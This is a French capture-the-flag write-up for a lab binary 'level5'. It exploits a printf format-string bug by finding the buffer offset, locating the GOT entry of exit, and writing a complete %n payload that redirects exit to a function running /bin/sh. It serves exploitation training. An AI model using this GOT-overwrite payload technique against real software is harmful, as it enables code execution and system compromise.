# level5 — format string

    void o(void)
    {
        system("/bin/sh");
                            // WARNING: Subroutine does not return
        _exit(1);
    }

    void n(void)
    {
        char local_20c [520];
        
        fgets(local_20c,0x200,stdin);
        printf(local_20c);
                            // WARNING: Subroutine does not return
        exit(1);
    }

    void main(void)
    {
        n();
        return;
    }



Encore un format string (`printf(buf)` sans `"%s"`, dans `n()`), mais cette fois il n'y a **aucun appel à `system()` sur le chemin normal du programme** — `n()` se contente de `fgets` + `printf` + `exit(1)`.
il y a la fonction `o()`, qui elle fait bien `system("/bin/sh")` :


Le souci : `n()` termine toujours avec `exit()`, pas `return` impossible de rediriger un retour de fonction ici comme au level1/level2. Mais `exit` est une fonction de la libc, appelée via son entrée dans la **PLT/GOT** une table d'adresses que le programme consulte à chaque appel :

Le plan : utiliser le format string pour **écraser l'entrée GOT de `exit`** avec l'adresse de `o()`. La prochaine fois que le programme appelle `exit(1)`, il va sauter dans `o()` à la place — et `o()` lance le shell.

**Trouver la position de notre buffer**

     echo "BBBB %x %x %x %x %x %x %x" | ./level5
    BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078

`BBBB` en 4e position → `%4$n`.


**Les deux adresses**

    objdump -R level5 | grep exit
    08049828 R_386_JUMP_SLOT   _exit
    08049838 R_386_JUMP_SLOT   exit

    https://picoctfsolutions.com/tools/pwntools-payload
    08049838 = \x38\x98\x04\x08


    (gdb) p &o
    $1 = (<text variable, no debug info> *) 0x80484a4 <o>
    https://www.rapidtables.com/convert/number/hex-to-decimal.html?x=080484A4
    0x080484a4 = 134513828
    
**Construire le payload**

Même astuce de largeur que level4, pour atteindre `134513828` sans écrire des millions de `'B'` :

    134513824 (largeur du %d) + 4 (octets d'adresse) = 134513828 = 0x080484a4

    (printf '\x38\x98\x04\x08'; printf '%s' '%134513824d%4$n') > /tmp/payload

injection :

    (cat payload; cat -) | ./level5

